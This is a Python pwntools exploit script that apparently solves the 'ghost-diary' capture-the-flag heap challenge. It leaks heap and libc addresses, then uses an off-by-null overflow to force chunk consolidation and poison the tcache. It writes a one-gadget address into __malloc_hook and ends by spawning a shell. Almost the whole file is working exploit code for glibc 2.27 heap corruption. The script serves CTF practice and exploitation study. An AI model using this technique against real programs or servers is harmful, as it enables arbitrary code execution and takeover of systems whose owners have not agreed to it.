#!/usr/bin/env python

import argparse
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = '/problems/ghost-diary_0_3fe5c3d8597f5f041d53fd64c0d577d2/ghostdiary'
libc = '/lib/x86_64-linux-gnu/libc-2.27.so'
host = None
port = None

# ====================================================================
#   GLOBALS
# ====================================================================

T     = None      # The Target
LIBC  = None      # Libc ELF
BIN   = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)
            raw_input('PAUSED [PRESS ENTER TO CONTINUE]')

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================

    def new_page(self, size):
        self.sendlineafter('>', '1')
        self.sendlineafter('>', '1' if size <= 0xf0 else '2')
        self.sendlineafter('size: ', str(size))

    def write_page(self, page, data):
        self.sendlineafter('>', '2')
        self.sendlineafter('Page: ', str(page))
        self.sendlineafter('Content: ', data)

    def read_page(self, page):
        self.sendlineafter('>', '3')
        self.sendlineafter('Page: ', str(page))
        self.recvuntil('Content: ')
        return self.recvuntil('1. New', drop=True).strip()

    def burn_page(self, page):
        self.sendlineafter('>', '4')
        self.sendlineafter('Page: ', str(page))

    def leak_heap(self, index=0):
        ''' Leak the heap base address '''
        for _ in range(2):
            T.new_page(0x18)

        for i in range(2):
            T.burn_page(i + index)

        T.new_page(0x18)
        leak = pwn.u64(T.read_page(index).ljust(8, '\x00')) - 0x260
        T.burn_page(index)
        return leak

    def fill_tcache_bin(self, size, index=0):
        ''' Fill the desired tcache bin '''
        for _ in range(7):
            T.new_page(size)

        for i in range(7):
            T.burn_page(i + index)

def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BIN = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, args.port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    # Valid sizes:
    # 1 page:  size <= 0xf0
    # 2 pages: 0x10f <= size <= 0x1e0

    UNSORTED_BIN_OFFSET = 0x3ebeb0
    ONE_GADGET = 0x10a38c

    # (1) allocate four chunks (A, B, C and the barrier chunk)
    T.new_page(0xf0)
    T.new_page(0x18)    # target chunk (we will overwrite it's fd)
    T.new_page(0xf0)
    T.new_page(0x18)    # barrier chunk

    # (2) leak heap base
    heap_base = T.leak_heap(index=4)
    T.info('Heap base leaked: ' + hex(heap_base))

    # (3) fill the tcache bin for size 0x100
    T.fill_tcache_bin(0xf0, index=4)

    # (4) burn first page, it will be paced in the unsorted bin
    T.burn_page(0)

    # (5) overflow into chunkC metadata and unset the PREV_IN_USE flag,
    # also set the prev_size to 0x120 (chunkB + chunkA)
    T.write_page(1, 'B' * 0x10 + pwn.p64(0x120))

    # (6) free chunkC to trigger consolidation with chunkA
    T.burn_page(2)

    # (7) allocate a chunk large enough to overlap with chunkB
    T.new_page(0x1e0)

    # (8) leak GLIBC address
    LIBC.address = pwn.u64(T.read_page(0).ljust(8, b'\x00')) - UNSORTED_BIN_OFFSET
    T.info('GLIBC base:    ' + hex(LIBC.address))
    T.info('__malloc_hook: ' + hex(LIBC.sym['__malloc_hook']))

    # (9) free chunkB and place it in the tcache bin
    T.burn_page(1)

    # (10) overwrite chunkB fd with __malloc_hook
    T.write_page(0, 'A' * 0x100 + pwn.p64(LIBC.sym['__malloc_hook']))

    # (11) reallocate chunkB so tcache will place __malloc_hook in the first bin
    T.new_page(0x18)

    # (12) allocate a chunk of size 0x18 to get a pointer to __malloc_hook
    T.new_page(0x18)

    # (13) put the address of an RCE gadget in __malloc_hook
    T.write_page(2, pwn.p64(LIBC.address + ONE_GADGET))

    # (14) trigger __malloc_hook and get the shell
    T.new_page(0)

    T.interactive()

